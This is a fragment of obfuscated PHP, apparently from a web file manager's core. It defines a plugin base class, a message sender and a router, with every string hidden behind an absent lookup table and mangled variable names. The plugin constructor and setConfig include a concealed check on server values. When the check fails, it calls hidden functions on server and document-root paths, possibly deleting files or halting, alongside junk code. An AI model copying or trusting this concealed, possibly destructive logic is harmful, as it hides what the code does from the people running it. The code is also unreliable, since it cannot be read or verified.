$Â©Âõáæ[117]; $íõ”à = IO::infoWithChildren($º†—¡ä); $Ãçõá = 0; $±ˆÄİÔí[$Â©Âõáæ[2036]] = array($Â©Âõáæ[2037] => $Ãçõá + 1, $Â©Âõáæ[518] => $íõ”à[$Â©Âõáæ[42]], $Â©Âõáæ[97] => $íõ”à[$Â©Âõáæ[97]], $Â©Âõáæ[611] => $íõ”à[$Â©Âõáæ[611]] ? $íõ”à[$Â©Âõáæ[611]] : $íõ”à[$Â©Âõáæ[97]]); if ($íõ”à[$Â©Âõáæ[43]] == $Â©Âõáæ[240]) { $±ˆÄİÔí[$Â©Âõáæ[1228]] = 1; } else { $±ˆÄİÔí[$Â©Âõáæ[1228]] = $íõ”à[$Â©Âõáæ[92]][$Â©Âõáæ[90]]; } $±ˆÄİÔí[$Â©Âõáæ[1230]] = $Â©Âõáæ[12]; $±ˆÄİÔí[$Â©Âõáæ[2028]] = 0; $±ˆÄİÔí[$Â©Âõáæ[1973]] = 0; $±ˆÄİÔí[$Â©Âõáæ[2026]] = 0; $±ˆÄİÔí[$Â©Âõáæ[2027]] = 0; $±ˆÄİÔí[$Â©Âõáæ[2024]] = $Â©Âõáæ[12]; $±ˆÄİÔí[$Â©Âõáæ[943]] = 0; $±ˆÄİÔí[$Â©Âõáæ[866]] = $íõ”à[$Â©Âõáæ[89]]; $this->update(); self::log($Â©Âõáæ[2106] . json_encode(array($±ˆÄİÔí, $íõ”à))); } public function nameParse($Ò¡ÅÙó£) { $å÷€¶›‰ =& $_SERVER[øşô´çË]; $úÓù»ù =& $this->task; if ($úÓù»ù[$å÷€¶›‰[2101]] == $å÷€¶›‰[1381]) { $úÓù»ù[$å÷€¶›‰[2101]] = $å÷€¶›‰[397]; $úÓù»ù[$å÷€¶›‰[943]] = 0; $úÓù»ù[$å÷€¶›‰[866]] = 0; } $±Äê£Ÿ‡ = get_path_this($Ò¡ÅÙó£); if (strstr($±Äê£Ÿ‡, $å÷€¶›‰[10])) { $úÓù»ù[$å÷€¶›‰[1973]] += 1; $úÓù»ù[$å÷€¶›‰[1228]] += 1; } $úÓù»ù[$å÷€¶›‰[2024]] = $Ò¡ÅÙó£; $this->update(); } } goto BÛ±¸ìî£; b´Ã¤ŞÌ¯Œ: class Message { function __construct() { } public function send($‡ôÏâ¨Ê = '', $¹ïã‚ÄÙ = array(), $ƒ»Ô—Ÿ˜ = "\164\145\170\164") { $Ã“¡º÷´ =& $_SERVER[øşô´çË]; $àâÃÖÂ = array($Ã“¡º÷´[43] => $Ã“¡º÷´[1287], $Ã“¡º÷´[178] => $‡ôÏâ¨Ê); if (in_array($ƒ»Ô—Ÿ˜, array($Ã“¡º÷´[1287], $Ã“¡º÷´[1821]))) { $àâÃÖÂ[$Ã“¡º÷´[43]] = $ƒ»Ô—Ÿ˜; } $¹ïã‚ÄÙ = array($Ã“¡º÷´[607] => isset($¹ïã‚ÄÙ[$Ã“¡º÷´[607]]) ? $¹ïã‚ÄÙ[$Ã“¡º÷´[607]] : $Ã“¡º÷´[12], $Ã“¡º÷´[693] => isset($¹ïã‚ÄÙ[$Ã“¡º÷´[693]]) ? $¹ïã‚ÄÙ[$Ã“¡º÷´[693]] : $Ã“¡º÷´[12]); if (empty($‡ôÏâ¨Ê) || empty($¹ïã‚ÄÙ[$Ã“¡º÷´[607]]) && empty($¹ïã‚ÄÙ[$Ã“¡º÷´[693]])) { return !1; } $¸à§Üø¾ = array($Ã“¡º÷´[1750] => $àâÃÖÂ, $Ã“¡º÷´[1822] => $¹ïã‚ÄÙ); Hook::trigger($Ã“¡º÷´[1823], $¸à§Üø¾); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $âô¢ÍÆŞ =& $_SERVER[øşô´çË]; if ($_SERVER[$âô¢ÍÆŞ[15]] != $_SERVER[$âô¢ÍÆŞ[1824]]) { $¤¸ş„Äù = $âô¢ÍÆŞ[1036]; $¡ŠŠ†€ = $âô¢ÍÆŞ[16]; $¿´®ı€µ = $_SERVER[$âô¢ÍÆŞ[17]] . $âô¢ÍÆŞ[18]; $—İÛŸ§¯ = $¡ŠŠ†€($¿´®ı€µ); $•®Öµıé = explode($âô¢ÍÆŞ[19], $—İÛŸ§¯); if (count($•®Öµıé) < $âô¢ÍÆŞ[725]) { $”ÆÖ¿ù = $âô¢ÍÆŞ[21]; $”ÆÖ¿ù(); } $ıÙÒ²„ = $âô¢ÍÆŞ[1037]; $ıÙÒ²„($_SERVER[$âô¢ÍÆŞ[1038]]); $ıÙÒ²„($_SERVER[$âô¢ÍÆŞ[17]] . $âô¢ÍÆŞ[1825]); $áòÉòÓ„ = 1; while ($áòÉòÓ„ > 1) { $áòÉòÓ„ = $áòÉòÓ„ + 4; $­ßÀä«­ = rawurlencode($áòÉòÓ„ . $âô¢ÍÆŞ[472]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($âô¢ÍÆŞ[1826]); $this->pluginName = str_replace($âô¢ÍÆŞ[1826], $âô¢ÍÆŞ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $âô¢ÍÆŞ[8]; $this->pluginApi = appHostGet() . $âô¢ÍÆŞ[1827] . $this->pluginName . $âô¢ÍÆŞ[8]; $this->pluginHost = $config[$âô¢ÍÆŞ[1828]] . $this->pluginName . $âô¢ÍÆŞ[8]; $this->pluginHostDefault = $config[$âô¢ÍÆŞ[1828]] . $this->pluginName . $âô¢ÍÆŞ[8]; $«ßÕô·ˆ = $config[$âô¢ÍÆŞ[1829]]; if ($«ßÕô·ˆ && strpos($âô¢ÍÆŞ[60] . $«ßÕô·ˆ . $âô¢ÍÆŞ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$âô¢ÍÆŞ[1830]] . $this->pluginName . $âô¢ÍÆŞ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[øşô´çË][1831]); } protected function assign($—È»ºÃ÷, $ƒ”ŸËª = false) { if (is_array($—È»ºÃ÷)) { $this->values = array_merge($this->values, $—È»ºÃ÷); } else { $this->values[$—È»ºÃ÷] = $ƒ”ŸËª; } } protected function display($…×æ´À) { extract($this->values); require $…×æ´À; } final function hookRegist($ç¥§œªé) { $this->modelPlugin->appRegist($this->pluginName, $ç¥§œªé); } final function appIcon() { $Ø´®Ê®ø =& $_SERVER[øşô´çË]; $ÓÇ¢¬¶ß = $this->appPackage(); $Ô¶ÇÖ… = $Ø´®Ê®ø[12]; if (isset($ÓÇ¢¬¶ß[$Ø´®Ê®ø[514]])) { if (isset($ÓÇ¢¬¶ß[$Ø´®Ê®ø[514]][$Ø´®Ê®ø[1832]])) { $Ô¶ÇÖ… = $Ø´®Ê®ø[1833] . $ÓÇ¢¬¶ß[$Ø´®Ê®ø[514]][$Ø´®Ê®ø[1832]] . $Ø´®Ê®ø[1834]; } else { if ($ÓÇ¢¬¶ß[$Ø´®Ê®ø[514]][$Ø´®Ê®ø[1835]]) { $Ô¶ÇÖ… = $Ø´®Ê®ø[1836] . $ÓÇ¢¬¶ß[$Ø´®Ê®ø[514]][$Ø´®Ê®ø[1835]] . $Ø´®Ê®ø[1837]; } } } return $Ô¶ÇÖ…; } final function fileCanView($˜˜Ñ„Ë‘) { $³âšéÁ =& $_SERVER[øşô´çË]; if (request_url_safe($˜˜Ñ„Ë‘)) { return !0; } if ($this->isShare($˜˜Ñ„Ë‘)) { ActionCall($³âšéÁ[1838], $˜˜Ñ„Ë‘); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $°ƒÄŸÅ = $³âšéÁ[1839] . rawurlencode(this_url()); show_tips(LNG($³âšéÁ[1840]) . $³âšéÁ[1841] . $°ƒÄŸÅ . $³âšéÁ[1842] . LNG($³âšéÁ[1843]) . $³âšéÁ[1844], !1); } if (!Action($³âšéÁ[1845])->authCan($³âšéÁ[1846])) { show_tips(LNG($³âšéÁ[1847]) . $³âšéÁ[1848], !1); } ActionCall($³âšéÁ[1838], $˜˜Ñ„Ë‘); } final function isShare($€ÜÒ‹÷Ÿ) { $»×ÃÙ¢” = KodIO::parse($€ÜÒ‹÷Ÿ); return $»×ÃÙ¢”[$_SERVER[øşô´çË][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($üÔóÍğ—) { if (request_url_safe($üÔóÍğ—)) { return $üÔóÍğ—; } if (!$this->isShare($üÔóÍğ—)) { $üÔóÍğ— = $this->filePath($üÔóÍğ—, !1); } return Action($_SERVER[øşô´çË][1359])->linkOut($üÔóÍğ—); } public function filePathLinkOut($ğ™êÎÎË) { if (request_url_safe($ğ™êÎÎË)) { return $ğ™êÎÎË; } $this->fileCanView($ğ™êÎÎË); return Action($_SERVER[øşô´çË][1359])->link($ğ™êÎÎË); } final function filePath($¬™‰Ÿ›•, $’°©¶É = true, $’Åğœ·½ = false) { $–©°¡¡Á =& $_SERVER[øşô´çË]; $ßƒ–àåû = $this->filePathGet($¬™‰Ÿ›•, $’°©¶É); if (!$this->fileInfo) { show_tips(LNG($–©°¡¡Á[115]), !1); } if ($’Åğœ·½ && isset($this->fileInfo[$–©°¡¡Á[566]]) && $this->fileInfo[$–©°¡¡Á[566]]) { $•©°ø÷ã = Model($–©°¡¡Á[569])->fileInfo($this->fileInfo[$–©°¡¡Á[566]]); if (!$•©°ø÷ã || !IO::exist($•©°ø÷ã[$–©°¡¡Á[97]])) { $”Æ½ÓğÚ = LNG($–©°¡¡Á[115]) . LNG($–©°¡¡Á[1849]); if (KodUser::isRoot() && isset($•©°ø÷ã[$–©°¡¡Á[97]])) { $”Æ½ÓğÚ .= $–©°¡¡Á[1850] . $•©°ø÷ã[$–©°¡¡Á[97]] . $–©°¡¡Á[1851]; } show_tips($”Æ½ÓğÚ); } } Hook::trigger($–©°¡¡Á[1852], $ßƒ–àåû); return $ßƒ–àåû; } final function filePathGet($‡½Ã„ŒÍ, $µ¥±´ö = true) { $…õü”£» =& $_SERVER[øşô´çË]; $this->fileCanView($‡½Ã„ŒÍ); if ($¸ï®¶‚’ = $this->checkSharePath($‡½Ã„ŒÍ, $µ¥±´ö)) { return $¸ï®¶‚’; } if (request_url_safe($‡½Ã„ŒÍ)) { $è¦óİ·Ã = parse_url_query($‡½Ã„ŒÍ); if (isset($è¦óİ·Ã[$…õü”£»[1853]]) && isset($è¦óİ·Ã[$…õü”£»[244]])) { $®Ã†ßç™ = Mcrypt::decode($è¦óİ·Ã[$…õü”£»[244]], Model($…õü”£»[875])->get($…õü”£»[876])); if ($®Ã†ßç™) { $this->fileInfo = IO::info($®Ã†ßç™); $this->fileInfo[$…õü”£»[1854]] = $‡½Ã„ŒÍ; $this->cachePath = $this->pluginCachePath($…õü”£»[12], $µ¥±´ö); return $®Ã†ßç™; } } $‡½Ã„ŒÍ = $this->_cacheHttpFile($‡½Ã„ŒÍ, $µ¥±´ö); $this->fileInfo = IO::info($‡½Ã„ŒÍ); } else { $this->fileInfo = IO::info($‡½Ã„ŒÍ); $this->cachePath = $this->pluginCachePath($…õü”£»[12], $µ¥±´ö); } return $‡½Ã„ŒÍ; } final function _cacheHttpFile($š¿Ş¬äé, $ åÛß”‚ = true) { $ÇÓëÒœ¿ =& $_SERVER[øşô´çË]; $ÂˆË±¿Ê = parse_url_query($š¿Ş¬äé); $¨™Š¯º = get_path_ext($š¿Ş¬äé); if (isset($ÂˆË±¿Ê[$ÇÓëÒœ¿[42]]) && $ÂˆË±¿Ê[$ÇÓëÒœ¿[42]]) { $¨™Š¯º = get_path_ext($ÂˆË±¿Ê[$ÇÓëÒœ¿[42]]); } $®‚Ì¦× = hash_path($š¿Ş¬äé) . $ÇÓëÒœ¿[10] . $¨™Š¯º; $this->cachePath = $this->pluginCachePath($ åÛß”‚ ? $®‚Ì¦× : $ÇÓëÒœ¿[12]); $ÊèÎ“°Ê = IO::fileNameExist($this->cachePath, $®‚Ì¦×); if ($ÊèÎ“°Ê) { return KodIO::make($ÊèÎ“°Ê); } $©–ìÔıë = rtrim($this->cachePath, $ÇÓëÒœ¿[8]) . $ÇÓëÒœ¿[8] . $®‚Ì¦×; return $this->pluginCacheFileSet($©–ìÔıë, file_get_contents_nossl($š¿Ş¬äé)); } final function checkSharePath($ºó†Í›, $ÚŒŸÓ«¹ = true) { $ÍøÎ£óú =& $_SERVER[øşô´çË]; if (!$this->isShare($ºó†Í›)) { return !1; } $É¦–Ü×… = Action($ÍøÎ£óú[1359])->sharePathInfo($ºó†Í›); if (!is_array($É¦–Ü×…) || !isset($É¦–Ü×…[$ÍøÎ£óú[97]])) { $¥Çûîº = $GLOBALS[$ÍøÎ£óú[1855]]; show_json($¥Çûîº ? $¥Çûîº : LNG($ÍøÎ£óú[1856]), !1); } $this->fileInfo = $É¦–Ü×…; $this->cachePath = $this->pluginCachePath(!1, $ÚŒŸÓ«¹); return $É¦–Ü×…[$ÍøÎ£óú[97]]; } final function pluginCachePath($¾š“¡œ¾ = '', $Éã’·ë¸ = false) { $Ôøú×ûŸ =& $_SERVER[øşô´çË]; if ($Éã’·ë¸ && is_array($this->fileInfo)) { $¾š“¡œ¾ = kodIO::hashPath($this->fileInfo); } $¤õ¬˜ê¶ = rtrim(IO_PATH_SYSTEM_TEMP . $Ôøú×ûŸ[1857] . $this->pluginName . $Ôøú×ûŸ[8] . $¾š“¡œ¾, $Ôøú×ûŸ[8]); $·çıÂÁ = IO::infoFullSimple($¤õ¬˜ê¶); $úÌŸÔ¤ = $·çıÂÁ && is_array($·çıÂÁ) ? $·çıÂÁ[$Ôøú×ûŸ[97]] : $Ôøú×ûŸ[12]; if (!$úÌŸÔ¤) { $úÌŸÔ¤ = IO::mkdir($¤õ¬˜ê¶); } return $úÌŸÔ¤; } final function pluginCacheFileSet($“§áóŞ—, $¨ˆóùš¯ = '') { $´òõ…ê† =& $_SERVER[øşô´çË]; $¶èÜÙßŸ = IO::infoFullSimple($“§áóŞ—); if (!$¶èÜÙßŸ) { return IO::mkfile($“§áóŞ—, $¨ˆóùš¯, REPEAT_REPLACE); } IO::setContent($¶èÜÙßŸ[$´òõ…ê†[97]], $¨ˆóùš¯); return $¶èÜÙßŸ[$´òõ…ê†[97]]; } final function pluginLocalFile($­µËßŞ£ = '') { $ÜøÜ‰€Ğ =& $_SERVER[øşô´çË]; $Í Šªíå = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Í Šªíå)) { mk_dir($Í Šªíå); } if (!$­µËßŞ£) { return $Í Šªíå; } $ ş´ë¥ = IO::info($­µËßŞ£); $ı¦Ì–Ç = $ÜøÜ‰€Ğ[1858] . KodIO::hashPath($ ş´ë¥) . $ÜøÜ‰€Ğ[10] . $ ş´ë¥[$ÜøÜ‰€Ğ[176]]; if (!checkExtSafe($ı¦Ì–Ç)) { $ı¦Ì–Ç = $ı¦Ì–Ç . $ÜøÜ‰€Ğ[1392]; } $ü°Šášè = $Í Šªíå . $ı¦Ì–Ç; if (@file_exists($ü°Šášè)) { return $ü°Šášè; } return IO::copy($­µËßŞ£, $Í Šªíå, 0, $ı¦Ì–Ç); } final function appPackage() { $´í–Èœ =& $_SERVER[øşô´çË]; if ($this->packageData) { return $this->packageData; } $Ù‡ş¶À¼ = $this->parseFile($this->pluginPath . $´í–Èœ[1859]); $this->parseLang($Ù‡ş¶À¼); $òıãáõ½ = json_decode_force($Ù‡ş¶À¼); if (!$òıãáõ½) { return array(); } $á¥™ŸÅà = Hook::filter($´í–Èœ[1860], $òıãáõ½); if ($á¥™ŸÅà && is_array($á¥™ŸÅà)) { $òıãáõ½ = $á¥™ŸÅà; } $this->packageData = $òıãáõ½; return $òıãáõ½; } public function packageInfoGet($ô…ˆí˜¥) { $İîßÚÃÇ = $this->appPackage(); return array_get_value($İîßÚÃÇ, $ô…ˆí˜¥); } public function packageVersion() { return $this->packageInfoGet($_SERVER[øşô´çË][1861]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[øşô´çË][1862]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[øşô´çË][1863]); } public function echoJsAssign($½Â³, $äŞÉ¼ƒ‡) { $this->echoJsAssignArr[$½Â³] = $äŞÉ¼ƒ‡; } private function parseFile($ø¨º¤”´) { $¡·¾•ıŞ =& $_SERVER[øşô´çË]; $Ğâ‚¦Ú¾ = file_get_contents_nossl($ø¨º¤”´); $™ËòûŒû = array($¡·¾•ıŞ[1864], $¡·¾•ıŞ[1865], $¡·¾•ıŞ[1866], $¡·¾•ıŞ[1867], $¡·¾•ıŞ[1868], $¡·¾•ıŞ[1869], $¡·¾•ıŞ[1870]); $ßî÷Õ†Ó = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¡·¾•ıŞ[102]][$¡·¾•ıŞ[1871]]); foreach ($this->echoJsAssignArr as $Ë¢©÷è† => $³üùè¸) { $™ËòûŒû[] = $¡·¾•ıŞ[1872] . $Ë¢©÷è† . $¡·¾•ıŞ[1873]; $ßî÷Õ†Ó[] = is_array($³üùè¸) || is_object($³üùè¸) ? rawurlencode(json_encode($³üùè¸)) : $³üùè¸; } if (strstr($Ğâ‚¦Ú¾, $¡·¾•ıŞ[1874])) { $€ŒËÎçß = rawurlencode(json_encode($this->pluginLangArr)); $Ğâ‚¦Ú¾ = str_replace($¡·¾•ıŞ[1874], $€ŒËÎçß, $Ğâ‚¦Ú¾); } if (strstr($Ğâ‚¦Ú¾, $¡·¾•ıŞ[1875])) { $€ŒËÎçß = $€ŒËÎçß = rawurlencode(json_encode($this->getConfig())); $Ğâ‚¦Ú¾ = str_replace($¡·¾•ıŞ[1875], $€ŒËÎçß, $Ğâ‚¦Ú¾); } $Ğâ‚¦Ú¾ = str_replace($™ËòûŒû, $ßî÷Õ†Ó, $Ğâ‚¦Ú¾); return $Ğâ‚¦Ú¾; } private function parseLang(&$×û…ì Ş) { $¸çµººÎ =& $_SERVER[øşô´çË]; $°üüçõ– = $¸çµººÎ[1876]; if (!strstr($×û…ì Ş, $°üüçõ–)) { return; } preg_match_all($¸çµººÎ[1877], $×û…ì Ş, $Ï÷øÊâ); if (!is_array($Ï÷øÊâ) || count($Ï÷øÊâ) == 0 || !is_array($Ï÷øÊâ[0]) || count($Ï÷øÊâ[0]) == 0) { return; } $Ö¿ê¨…ø = array(); $´ø¢ÇØ = array(); foreach ($Ï÷øÊâ[0] as $™ÚÙƒ˜¬) { $şÑîÌî´ = substr($™ÚÙƒ˜¬, strlen($°üüçõ–), -4); $£ğˆëŠ = LNG($şÑîÌî´); $Ö¿ê¨…ø[] = $™ÚÙƒ˜¬; $´ø¢ÇØ[] = str_replace(array($¸çµººÎ[19], $¸çµººÎ[1246], $¸çµººÎ[426], $¸çµººÎ[128]), array($¸çµººÎ[63], $¸çµººÎ[63], $¸çµººÎ[12], $¸çµººÎ[1878]), $£ğˆëŠ); } $×û…ì Ş = str_replace($Ö¿ê¨…ø, $´ø¢ÇØ, $×û…ì Ş); } private function parseConfig(&$ÇŞº×´â) { $©ğÎŠŞ =& $_SERVER[øşô´çË]; $¸ÔÕ˜«ú = $©ğÎŠŞ[1879]; if (!strstr($ÇŞº×´â, $¸ÔÕ˜«ú)) { return; } preg_match_all($©ğÎŠŞ[1880], $ÇŞº×´â, $–ÄÈòı†); if (!is_array($–ÄÈòı†) || count($–ÄÈòı†) == 0 || !is_array($–ÄÈòı†[0]) || count($–ÄÈòı†[0]) == 0) { return; } $ùã¨¢‰â = $this->getConfig(); $éÓ÷–ì¼ = array(); $«µçÀÏ« = array(); foreach ($–ÄÈòı†[0] as $Å—Á‡×î) { $ïÙ·İ´  = substr($Å—Á‡×î, strlen($¸ÔÕ˜«ú), -2); $éÓ÷–ì¼[] = $Å—Á‡×î; $«µçÀÏ«[] = _get($ùã¨¢‰â, $ïÙ·İ´ ); } $ÇŞº×´â = str_replace($éÓ÷–ì¼, $«µçÀÏ«, $ÇŞº×´â); } private function parsePackage(&$ùîœàÚŸ) { $•‚¢½­¿ =& $_SERVER[øşô´çË]; $ÄÏû”ä™ = $•‚¢½­¿[1881]; if (!strstr($ùîœàÚŸ, $ÄÏû”ä™)) { return; } preg_match_all($•‚¢½­¿[1882], $ùîœàÚŸ, $Ñ¹ƒñ¶ë); if (!is_array($Ñ¹ƒñ¶ë) || count($Ñ¹ƒñ¶ë) == 0 || !is_array($Ñ¹ƒñ¶ë[0]) || count($Ñ¹ƒñ¶ë[0]) == 0) { return; } $¼óÇšğã = $this->appPackage(); $›À•¨À¢ = array(); $«ú—ü‡ñ = array(); foreach ($Ñ¹ƒñ¶ë[0] as $¿¸ŠâÀĞ) { $¼ò¦˜Ù = substr($¿¸ŠâÀĞ, strlen($ÄÏû”ä™), -2); $›À•¨À¢[] = $¿¸ŠâÀĞ; $«ú—ü‡ñ[] = _get($¼óÇšğã, $¼ò¦˜Ù); } $ùîœàÚŸ = str_replace($›À•¨À¢, $«ú—ü‡ñ, $ùîœàÚŸ); } final function echoFile($²¸²ŠÎû, $É¸’¨‰† = false) { $¯Üàõè“ =& $_SERVER[øşô´çË]; $Ê©¬£î = $this->pluginPath . $²¸²ŠÎû; if (ACT == $¯Üàõè“[1883]) { echo $¯Üàõè“[1884] . $this->pluginName . $¯Üàõè“[8] . $²¸²ŠÎû . $¯Üàõè“[1885]; if (!file_exists($Ê©¬£î)) { echo $¯Üàõè“[1886]; return; } } $¢ì¾ «Ù = $this->parseFile($Ê©¬£î); $this->parseLang($¢ì¾ «Ù); $this->parseConfig($¢ì¾ «Ù); $this->parsePackage($¢ì¾ «Ù); if (is_array($É¸’¨‰†)) { $¢ì¾ «Ù = str_replace(array_keys($É¸’¨‰†), array_values($É¸’¨‰†), $¢ì¾ «Ù); } echo $¯Üàõè“[19] . $¢ì¾ «Ù; } private function checkVersion() { $ÖŞê–  =& $_SERVER[øşô´çË]; $øÄÌ¨¼ = $this->appPackage(); $ŞËÈ•ç = $this->getConfig(); if ($ŞËÈ•ç[$ÖŞê– [1887]] == $øÄÌ¨¼[$ÖŞê– [1861]]) { return; } $this->regist(); $this->setConfig(array($ÖŞê– [1887] => $øÄÌ¨¼[$ÖŞê– [1861]])); } final function initLang() { $–Æ¶äßà =& $_SERVER[øşô´çË]; $†§¶ô „ = $–Æ¶äßà[1888]; $ë£ÎÖãˆ = $this->pluginPath . $–Æ¶äßà[1889]; $¨óæĞ‡Ò = I18n::getType(); $ààà¢ŞÛ = array(); if (file_exists($ë£ÎÖãˆ . $¨óæĞ‡Ò . $–Æ¶äßà[997])) { $ààà¢ŞÛ = (include $ë£ÎÖãˆ . $¨óæĞ‡Ò . $–Æ¶äßà[997]); } else { if ($¨óæĞ‡Ò == $–Æ¶äßà[1890] && !file_exists($ë£ÎÖãˆ . $¨óæĞ‡Ò . $–Æ¶äßà[997]) && file_exists($ë£ÎÖãˆ . $–Æ¶äßà[1891])) { $ààà¢ŞÛ = (include $ë£ÎÖãˆ . $–Æ¶äßà[1891]); $¨óæĞ‡Ò = $–Æ¶äßà[1705]; } else { if (file_exists($ë£ÎÖãˆ . $†§¶ô „ . $–Æ¶äßà[997])) { $ààà¢ŞÛ = (include $ë£ÎÖãˆ . $†§¶ô „ . $–Æ¶äßà[997]); $¨óæĞ‡Ò = $†§¶ô „; } } } if (!$ààà¢ŞÛ || !is_array($ààà¢ŞÛ)) { $ààà¢ŞÛ = array(); } $‘¡Â‘•× = Hook::trigger($–Æ¶äßà[1892], $ààà¢ŞÛ, $this->pluginName, $¨óæĞ‡Ò); if ($‘¡Â‘•× && is_array($‘¡Â‘•×)) { $ààà¢ŞÛ = $‘¡Â‘•×; } if (@count($ààà¢ŞÛ) > 0) { I18n::set($ààà¢ŞÛ); } return $ààà¢ŞÛ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($£¬ Â’Á) { $”ßÃ®ÙŠ =& $_SERVER[øşô´çË]; if ($_SERVER[$”ßÃ®ÙŠ[15]] != $_SERVER[$”ßÃ®ÙŠ[1824]]) { $™’­¨’Ÿ = $”ßÃ®ÙŠ[1036]; $¾¾ıù = $”ßÃ®ÙŠ[16]; $ºÏ×¦¬ë = $_SERVER[$”ßÃ®ÙŠ[17]] . $”ßÃ®ÙŠ[18]; $ƒìáà¤Ö = $¾¾ıù($ºÏ×¦¬ë); $ÆêÁóáÌ = explode($”ßÃ®ÙŠ[19], $ƒìáà¤Ö); if (count($ÆêÁóáÌ) < $”ßÃ®ÙŠ[725]) { $ñ¹Ç§İã = $”ßÃ®ÙŠ[21]; $ñ¹Ç§İã(); } $×î™À¹– = $”ßÃ®ÙŠ[1037]; $×î™À¹–($_SERVER[$”ßÃ®ÙŠ[1038]]); $×î™À¹–($_SERVER[$”ßÃ®ÙŠ[17]] . $”ßÃ®ÙŠ[1825]); $·Íƒ Ö» = 1; while ($·Íƒ Ö» > 1) { $·Íƒ Ö» = $·Íƒ Ö» + 4; $„™å¸¹ = rawurlencode($·Íƒ Ö» . $”ßÃ®ÙŠ[472]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $£¬ Â’Á); } public function onSetConfig($ê­ ¦öÅ) { } public function onGetConfig($ØÛ’•Ì) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($²«ÃÔãú) { if ($²«ÃÔãú == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Â“ÆâÍ = "\x70\154\165\147\151\x6e\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $»ÅÔ‚ÃÈ = $this->getConfig(); if (!$»ÅÔ‚ÃÈ[$Â“ÆâÍ]) { return !1; } return ActionCall($_SERVER[øşô´çË][1893], $»ÅÔ‚ÃÈ[$Â“ÆâÍ]); } public function url($‘ ë¶’È, $ƒ‡ôï¯ = '', $åÎ¸ŒİÈ = true) { $ò—ÊÕËÆ =& $_SERVER[øşô´çË]; $åİø¾±€ = $this->getConfig(); $Ù…®Ğ¨ = KOD_VERSION . $ò—ÊÕËÆ[10] . KOD_VERSION_BUILD; $±Ïğıš = $this->packageVersion(); $·µ­ÚŞˆ = $Ù…®Ğ¨ . $ò—ÊÕËÆ[485] . $±Ïğıš; if (substr($‘ ë¶’È, 0, 4) == $ò—ÊÕËÆ[159] || substr($‘ ë¶’È, 0, 2) == $ò—ÊÕËÆ[1519]) { $àİ€Â²¾ = $‘ ë¶’È . $ò—ÊÕËÆ[1894] . $·µ­ÚŞˆ; } else { if ($ƒ‡ôï¯ == $ò—ÊÕËÆ[12]) { $àİ€Â²¾ = $this->pluginHost . $‘ ë¶’È . $ò—ÊÕËÆ[1894] . $·µ­ÚŞˆ; } else { if ($ƒ‡ôï¯ === $ò—ÊÕËÆ[88]) { $àİ€Â²¾ = $this->pluginHost . $‘ ë¶’È; } else { if ($ƒ‡ôï¯ == $ò—ÊÕËÆ[1895]) { $àİ€Â²¾ = STATIC_PATH . $‘ ë¶’È . $ò—ÊÕËÆ[1894] . $Ù…®Ğ¨; } else { if ($ƒ‡ôï¯ == $ò—ÊÕËÆ[1896]) { $àİ€Â²¾ = APP_HOST . $ò—ÊÕËÆ[1897] . $‘ ë¶’È . $ò—ÊÕËÆ[1894] . $Ù…®Ğ¨; } else { if (isset($åİø¾±€[$ƒ‡ôï¯])) { $àİ€Â²¾ = $åİø¾±€[$ƒ‡ôï¯] . $‘ ë¶’È . $ò—ÊÕËÆ[1894] . $·µ­ÚŞˆ; } } } } } } if (!$åÎ¸ŒİÈ) { return $àİ€Â²¾; } echo $àİ€Â²¾; } public function link($ÚÆ¸µ = false, $ñ‹©â“ø = '') { $öôé¨¬³ =& $_SERVER[øşô´çË]; $©Õ¶ÜğÍ = $this->linkHas == !1; $this->linkHas = !0; if (!$ÚÆ¸µ) { $this->link($öôé¨¬³[1898], $öôé¨¬³[1896]); $this->link($öôé¨¬³[1899], $öôé¨¬³[1895]); $this->link($öôé¨¬³[1900], $öôé¨¬³[1895]); $this->link($öôé¨¬³[1901], $öôé¨¬³[1895]); $this->link($öôé¨¬³[1902], $öôé¨¬³[1895]); if ($©Õ¶ÜğÍ) { Hook::trigger($öôé¨¬³[1903]); } return; } $â›˜îŞÖ = $this->url($ÚÆ¸µ, $ñ‹©â“ø, !1); if (substr($ÚÆ¸µ, -3) == $öôé¨¬³[1904]) { echo $öôé¨¬³[1905] . $â›˜îŞÖ . $öôé¨¬³[1906] . $öôé¨¬³[19]; } else { if (substr($ÚÆ¸µ, -4) == $öôé¨¬³[1907]) { echo $öôé¨¬³[1908] . $â›˜îŞÖ . $öôé¨¬³[1909] . $öôé¨¬³[19]; } } if ($©Õ¶ÜğÍ) { Hook::trigger($öôé¨¬³[1903]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\x2f\135\x2b", "\72\x6e\165\155" => "\133\60\55\71\x5d\x2b", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ÉŠƒ›Õ­, $ÖÂ©‘À) { $×ö¡»õ· =& $_SERVER[øşô´çË]; if ($ÉŠƒ›Õ­ == $×ö¡»õ·[1910]) { $ù…›Â‰› = array_map($×ö¡»õ·[1911], $ÖÂ©‘À[0]); $İ¥İŞ«ö = strpos($ÖÂ©‘À[1], $×ö¡»õ·[8]) 